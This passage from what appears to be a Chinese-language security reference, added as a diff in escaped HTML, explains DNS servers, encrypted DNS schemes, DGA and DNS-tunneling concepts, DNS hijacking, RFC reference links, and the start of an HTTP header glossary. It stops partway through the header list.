+&lt;p&gt;权威服务器需要在所承载的域名所属的TLD管理局注册，同一个权威服务器可以承载不同TLD域名，同一个域也可以有多个权威服务器。&lt;/p&gt;
+&lt;h5 id=&#34;2643-递归服务器&#34;&gt;2.6.4.3. 递归服务器
+&lt;/h5&gt;&lt;p&gt;递归服务器负责接收用户的查询请求，进行递归查询并响应用户查询请求。在初始时递归服务器仅有记录了根域名的Hint文件。&lt;/p&gt;
+&lt;h4 id=&#34;265-加密方案&#34;&gt;2.6.5. 加密方案
+&lt;/h4&gt;&lt;p&gt;作为主流的防御方案，DNS加密有五种方案，分别是 DNS-over-TLS (DoT)、DNS-over-DTLS、DNS-over-HTTPS (DoH)、DNS-over-QUIC以及DNSCrypt。&lt;/p&gt;
+&lt;h5 id=&#34;2651-dot&#34;&gt;2.6.5.1. DoT
+&lt;/h5&gt;&lt;p&gt;DoT方案在2016年发表于RFC7858，使用853端口。主要思想是Client和Server通过TCP协议建立TLS会话后再进行DNS传输，Client通过SSL证书验证服务器身份。&lt;/p&gt;
+&lt;h5 id=&#34;2652-dns-over-dtls&#34;&gt;2.6.5.2. DNS-over-DTLS
+&lt;/h5&gt;&lt;p&gt;DNS-over-DTLS和DoT类似，区别在于使用UDP协议而不是TCP协议。&lt;/p&gt;
+&lt;h5 id=&#34;2653-doh&#34;&gt;2.6.5.3. DoH
+&lt;/h5&gt;&lt;p&gt;DoH方案在发表RFC8484，使用 &lt;code&gt;https://dns.example.com/dns-query{?dns}&lt;/code&gt; 来查询服务器的IP，复用https的443端口，流量特征比较小。DoH会对DNS服务器进行加密认证，不提供fallback选项。目前Cloudflare、Google等服务商对DoH提供了支持。&lt;/p&gt;
+&lt;h5 id=&#34;2654-dns-over-quic&#34;&gt;2.6.5.4. DNS-over-QUIC
+&lt;/h5&gt;&lt;p&gt;DNS-over-QUIC安全特性和DoT类似，但是性能更高，目前没有合适的软件实现。&lt;/p&gt;
+&lt;h5 id=&#34;2655-dnscrypt&#34;&gt;2.6.5.5. DNSCrypt
+&lt;/h5&gt;&lt;p&gt;DNSCrypt使用X25519-XSalsa20Poly1305而非标准的TLS，且DNSCrypt的Client需要额外的软件，Server需要的专门的证书。&lt;/p&gt;
+&lt;h4 id=&#34;266-dns利用&#34;&gt;2.6.6. DNS利用
+&lt;/h4&gt;&lt;h5 id=&#34;2661-dga&#34;&gt;2.6.6.1. DGA
+&lt;/h5&gt;&lt;p&gt;DGA（Domain Generate Algorithm，域名生成算法）是一种利用随机字符来生成C&amp;amp;C域名，从而逃避域名黑名单检测的技术手段，常见于botnet中。一般来说，一个DGA域名的存活时间约在1-7天左右。&lt;/p&gt;
+&lt;p&gt;通信时，客户端和服务端都运行同一套DGA算法，生成相同的备选域名列表，当需要发动攻击的时候，选择其中少量进行注册，便可以建立通信，并且可以对注册的域名应用速变IP技术，快速变换IP，从而域名和IP都可以进行快速变化。&lt;/p&gt;
+&lt;p&gt;DGA域名有多种生成方式，根据种子类型可以分为确定性和不确定性的生成。不确定性的种子可能会选用当天的一些即时数据，如汇率信息等。&lt;/p&gt;
+&lt;h5 id=&#34;2662-dns隧道&#34;&gt;2.6.6.2. DNS隧道
+&lt;/h5&gt;&lt;p&gt;DNS隧道工具将进入隧道的其他协议流量封装到DNS协议内，在隧道上传输。这些数据包出隧道时进行解封装，还原数据。&lt;/p&gt;
+&lt;h4 id=&#34;267-rdap&#34;&gt;2.6.7. RDAP
+&lt;/h4&gt;&lt;p&gt;RDAP (Registration Data Access Protocol) 协议是Whois协议的后继，和 Whois 协议类似，RDAP协议提供了域名、自治系统、IP地址的信息查询。&lt;/p&gt;
+&lt;h4 id=&#34;268-相关漏洞&#34;&gt;2.6.8. 相关漏洞
+&lt;/h4&gt;&lt;h5 id=&#34;2681-dns劫持&#34;&gt;2.6.8.1. DNS劫持
+&lt;/h5&gt;&lt;p&gt;DNS劫持有多种方式，比较早期的攻击方式是通过攻击域名解析服务器，或是伪造DNS响应的方法，来将域名解析到恶意的IP地址。&lt;/p&gt;
+&lt;p&gt;随着互联网应用的不断发展，出现了基于废弃记录的劫持方式。这种方式发生的场景是次级域名的解析记录指向第三方资源，而第三方资源被释放后，解析记录并没有取消，在这种场景下，可以对应申请第三方资源，以获取控制解析记录的能力。&lt;/p&gt;
+&lt;h5 id=&#34;2682-拒绝服务&#34;&gt;2.6.8.2. 拒绝服务
+&lt;/h5&gt;&lt;p&gt;DNS服务通常会开启UDP端口，当DNS服务器拥有大量二级域NS记录时，通过DNS的UDP反射攻击可以实现高倍的拒绝服务。&lt;/p&gt;
+&lt;h4 id=&#34;269-相关机构&#34;&gt;2.6.9. 相关机构
+&lt;/h4&gt;&lt;h5 id=&#34;2691-icann&#34;&gt;2.6.9.1. ICANN
+&lt;/h5&gt;&lt;p&gt;互联网名称与数字地址分配机构 (Internet Corporation for Assigned Names and Numbers, ICANN) 创建于1998年9月18日，职能包括管理域名和IP地址的分配等与互联网相关的任务。&lt;/p&gt;
+&lt;h5 id=&#34;2692-iana&#34;&gt;2.6.9.2. IANA
+&lt;/h5&gt;&lt;p&gt;互联网号码分配局 (Internet Assigned Numbers Authority, IANA) ，是一家互联网地址指派机构，管理国际互联网中使用的IP地址、域名和许多其它参数的机构。&lt;/p&gt;
+&lt;h4 id=&#34;2610-术语&#34;&gt;2.6.10. 术语
+&lt;/h4&gt;&lt;h5 id=&#34;26101-mdns&#34;&gt;2.6.10.1. mDNS
+&lt;/h5&gt;&lt;p&gt;Multicast DNS (mDNS)，多播DNS，使用5353端口，组播地址为 &lt;code&gt;224.0.0.251&lt;/code&gt; 或 &lt;code&gt;[FF02::FB]&lt;/code&gt; 。在一个没有常规DNS服务器的小型网络内可以使用mDNS来实现类似DNS的编程接口、包格式和操作语义。mDNS协议的报文与DNS的报文结构相同，但有些字段对于mDNS来说有新的含义。&lt;/p&gt;
+&lt;p&gt;启动mDNS的主机会在进入局域网后向所有主机组播消息，包含主机名、IP等信息，其他拥有相应服务的主机也会响应含有主机名和IP的信息。&lt;/p&gt;
+&lt;p&gt;mDNS的域名是用 &lt;code&gt;.local&lt;/code&gt; 和普通域名区分开的。&lt;/p&gt;
+&lt;h5 id=&#34;26102-fqdn&#34;&gt;2.6.10.2. FQDN
+&lt;/h5&gt;&lt;p&gt;FQDN (Fully-Qualified Domain Name) 是域名的完全形态，主要是包含零长度的根标签，例如 &lt;code&gt;www.example.com.&lt;/code&gt; 。&lt;/p&gt;
+&lt;h5 id=&#34;26103-tld&#34;&gt;2.6.10.3. TLD
+&lt;/h5&gt;&lt;p&gt;Top-Level Domain (TLD) 是属于根域的一个域，例如 &lt;code&gt;com&lt;/code&gt; 或 &lt;code&gt;jp&lt;/code&gt; 。&lt;/p&gt;
+&lt;p&gt;TLD一般可以分为 Country Code Top-Level Domains (ccTLDs) 、Generic Top-Level Domains (gTLDs) 以及其它。&lt;/p&gt;
+&lt;h5 id=&#34;26104-idn&#34;&gt;2.6.10.4. IDN
+&lt;/h5&gt;&lt;p&gt;Internationalized Domain Names for Applications (IDNA) 是为了处理非ASCII字符的情况。&lt;/p&gt;
+&lt;h5 id=&#34;26105-cname&#34;&gt;2.6.10.5. CNAME
+&lt;/h5&gt;&lt;p&gt;CNAME即Canonical name，又称alias，将域名指向另一个域名。&lt;/p&gt;
+&lt;h5 id=&#34;26106-ttl&#34;&gt;2.6.10.6. TTL
+&lt;/h5&gt;&lt;p&gt;Time To Live，无符号整数，记录DNS记录过期的时间，最小是0，最大是2147483647 (2^31 - 1)。&lt;/p&gt;
+&lt;h4 id=&#34;2611-参考链接&#34;&gt;2.6.11. 参考链接
+&lt;/h4&gt;&lt;h5 id=&#34;26111-rfc&#34;&gt;2.6.11.1. RFC
+&lt;/h5&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.rfc-editor.org/rfc/rfc920&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;RFC 920 Domain Requirements&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://tools.ietf.org/html/rfc1034&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;RFC 1034 DOMAIN NAMES CONCEPTS AND FACILITIES&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://tools.ietf.org/html/rfc1035&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;RFC 1035 DOMAIN NAMES IMPLEMENTATION AND SPECIFICATION&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://tools.ietf.org/html/rfc1123&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;RFC 1123 Requirements for Internet Hosts &amp;ndash; Application and Support&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://tools.ietf.org/html/rfc2535&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;RFC 2535 Domain Name System Security Extensions&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://tools.ietf.org/html/rfc2930&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;RFC 2930 Secret Key Establishment for DNS (TKEY RR)&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://tools.ietf.org/html/rfc2931&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;RFC 2931 DNS Request and Transaction Signatures ( SIG(0)s )&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://tools.ietf.org/html/rfc3596&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;RFC 3596 Legacy Resolver Compatibility for Delegation Signer (DS)&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://tools.ietf.org/html/rfc3755&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;RFC 3755 DNS Extensions to Support IP Version 6&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://tools.ietf.org/html/rfc5001&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;RFC 5001 Automated Updates of DNS Security (DNSSEC) Trust Anchors&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://tools.ietf.org/html/rfc5936&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;RFC 5936 DNS Zone Transfer Protocol&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://tools.ietf.org/html/rfc5966&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;RFC 5966 DNS Transport over TCP - Implementation Requirements&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://tools.ietf.org/html/rfc6376&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;RFC 6376 DomainKeys Identified Mail (DKIM) Signatures&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://tools.ietf.org/html/rfc6762&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;RFC 6762 Multicast DNS&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://tools.ietf.org/html/rfc6891&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;RFC 6891 Extension Mechanisms for DNS (EDNS(0))&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://tools.ietf.org/html/rfc6895&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;RFC 6895 DNS IANA Considerations&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://tools.ietf.org/html/rfc7766&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;RFC 7766 DNS Transport over TCP - Implementation Requirements&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://tools.ietf.org/html/rfc7858&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;RFC 7858 Specification for DNS over Transport Layer Security (TLS)&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://tools.ietf.org/html/rfc7871&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;RFC 7871 Client Subnet in DNS Queries&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://tools.ietf.org/html/rfc8082&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;RFC 8082 NXDOMAIN&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://tools.ietf.org/html/rfc8482&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;RFC 8482 Providing Minimal-Sized Responses to DNS Queries That Have QTYPE=ANY&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://tools.ietf.org/html/rfc8484&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;RFC 8484 DNS Queries over HTTPS (DoH)&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://tools.ietf.org/html/rfc8490&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;RFC 8490 DNS Stateful Operations&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://tools.ietf.org/html/rfc8499&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;RFC 8499 DNS Terminology&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5 id=&#34;261111-whois-相关&#34;&gt;2.6.11.1.1. Whois 相关
+&lt;/h5&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://tools.ietf.org/html/rfc812&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;RFC 812 NICNAME/WHOIS&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://tools.ietf.org/html/rfc954&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;RFC 954 NICNAME/WHOIS&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://tools.ietf.org/html/rfc2167&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;RFC 2167 Referral Whois (RWhois) Protocol V1.5&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://tools.ietf.org/html/rfc3912&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;RFC 3912 WHOIS Protocol Specification&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://tools.ietf.org/html/rfc7485&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;RFC 7485 Inventory and Analysis of WHOIS Registration Objects&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5 id=&#34;261112-rdap-相关&#34;&gt;2.6.11.1.2. RDAP 相关
+&lt;/h5&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://tools.ietf.org/html/rfc7480&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;RFC7480 HTTP Usage in the Registration Data Access Protocol (RDAP)&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://tools.ietf.org/html/rfc7481&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;RFC7481 Security Services for the Registration Data Access Protocol (RDAP)&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://tools.ietf.org/html/rfc7484&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;RFC7484 Finding the Authoritative Registration Data (RDAP) Service&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://tools.ietf.org/html/rfc8056&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;RFC8056 Registration Data Access Protocol (RDAP) Object Tagging&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://tools.ietf.org/html/rfc9082&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;RFC9082 Registration Data Access Protocol (RDAP) Query Format&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://tools.ietf.org/html/rfc9083&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;RFC9083 JSON Responses for the Registration Data Access Protocol (RDAP)&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5 id=&#34;26112-相关标准&#34;&gt;2.6.11.2. 相关标准
+&lt;/h5&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://about.rdap.org/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Registration Data Access Protocol (RDAP)&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5 id=&#34;26113-工具&#34;&gt;2.6.11.3. 工具
+&lt;/h5&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/NLnetLabs/unbound&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Unbound&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://github.com/isc-projects/bind9&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;bind9&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5 id=&#34;26114-研究文章&#34;&gt;2.6.11.4. 研究文章
+&lt;/h5&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://mp.weixin.qq.com/s/xbf0Qbppk8R0nx89Pb4YTg&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;DGA域名的今生前世：缘起、检测、与发展&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://blog.thecjw.me/?p=1221&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;DNSSEC原理和分析&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Plohmann D, Yakdan K, Klatt M, et al. A comprehensive measurement study of domain generating malware[C]//25th {USENIX} Security Symposium ({USENIX} Security 16). 2016: 263-278.&lt;/li&gt;
+&lt;li&gt;An End-to-End Large-Scale Measurement of DNS-over-Encryption: How Far Have We Come?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5 id=&#34;26115-相关cve&#34;&gt;2.6.11.5. 相关CVE
+&lt;/h5&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://research.checkpoint.com/2020/resolving-your-way-into-domain-admin-exploiting-a-17-year-old-bug-in-windows-dns-servers/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;SIGRed – Resolving Your Way into Domain Admin: Exploiting a 17 Year-old Bug in Windows DNS Servers&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h4 id=&#34;27-http协议簇&#34;&gt;2.7. HTTP协议簇
+&lt;/h4&gt;&lt;h5 id=&#34;271-http标准&#34;&gt;2.7.1. HTTP标准
+&lt;/h5&gt;&lt;h6 id=&#34;2711-报文格式&#34;&gt;2.7.1.1. 报文格式
+&lt;/h6&gt;&lt;h2 id=&#34;27111-请求报文格式&#34;&gt;2.7.1.1.1. 请求报文格式
+&lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;method&amp;gt;&amp;lt;request-URL&amp;gt;&amp;lt;version&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;headers&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;entity-body&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;27112-响应报文格式&#34;&gt;2.7.1.1.2. 响应报文格式
+&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;version&amp;gt;&amp;lt;status&amp;gt;&amp;lt;reason-phrase&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;headers&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;entity-body&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;27113-字段解释&#34;&gt;2.7.1.1.3. 字段解释
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;method&lt;/p&gt;
+&lt;p&gt;HTTP动词常见方法：HEAD / GET / POST / PUT / DELETE / PATCH / OPTIONS / TRACE扩展方法：LOCK / MKCOL / COPY / MOVE&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;version&lt;/p&gt;
+&lt;p&gt;报文使用的HTTP版本格式为HTTP/&lt;major&gt;.&lt;minor&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;url&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;&amp;lt;scheme&amp;gt;://&amp;lt;user&amp;gt;:&amp;lt;password&amp;gt;@&amp;lt;host&amp;gt;:&amp;lt;port&amp;gt;/&amp;lt;path&amp;gt;;&amp;lt;params&amp;gt;?&amp;lt;query&amp;gt;#&amp;lt;frag&amp;gt;&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;2712-请求头列表&#34;&gt;2.7.1.2. 请求头列表
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Accept&lt;/p&gt;
+&lt;p&gt;指定客户端能够接收的内容类型Accept: text/plain, text/html&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Accept-Charset&lt;/p&gt;
+&lt;p&gt;浏览器可以接受的字符编码集Accept-Charset: iso-8859-5&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Accept-Encoding&lt;/p&gt;
+&lt;p&gt;指定浏览器可以支持的web服务器返回内容压缩编码类型Accept-Encoding: compress, gzip&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Accept-Language&lt;/p&gt;
+&lt;p&gt;浏览器可接受的语言Accept-Language: en,zh&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Accept-Ranges&lt;/p&gt;
+&lt;p&gt;可以请求网页实体的一个或者多个子范围字段Accept-Ranges: bytes&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Authorization&lt;/p&gt;
+&lt;p&gt;HTTP授权的授权证书Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Cache-Control&lt;/p&gt;
+&lt;p&gt;指定请求和响应遵循的缓存机制 Cache-Control: no-cache&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Connection&lt;/p&gt;
+&lt;p&gt;表示是否需要持久连接 // HTTP 1.1默认进行持久连接Connection: close&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Cookie&lt;/p&gt;
+&lt;p&gt;HTTP请求发送时，会把保存在该请求域名下的所有cookie值一起发送给web服务器Cookie: role=admin;ssid=1&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Content-Length&lt;/p&gt;
+&lt;p&gt;请求的内容长度Content-Length: 348&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Content-Type&lt;/p&gt;
+&lt;p&gt;请求的与实体对应的MIME信息Content-Type: application/x-www-form-urlencoded&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Date&lt;/p&gt;
+&lt;p&gt;请求发送的日期和时间Date: Tue, 15 Nov 2010 08:12:31 GMT&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Expect&lt;/p&gt;
+&lt;p&gt;请求的特定的服务器行为Expect: 100-continue&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;From&lt;/p&gt;
+&lt;p&gt;发出请求的用户的EmailFrom: &lt;a class=&#34;link&#34; href=&#34;mailto:user@email.com&#34; &gt;user@email.com&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;ul&gt;
+&lt;li&gt;
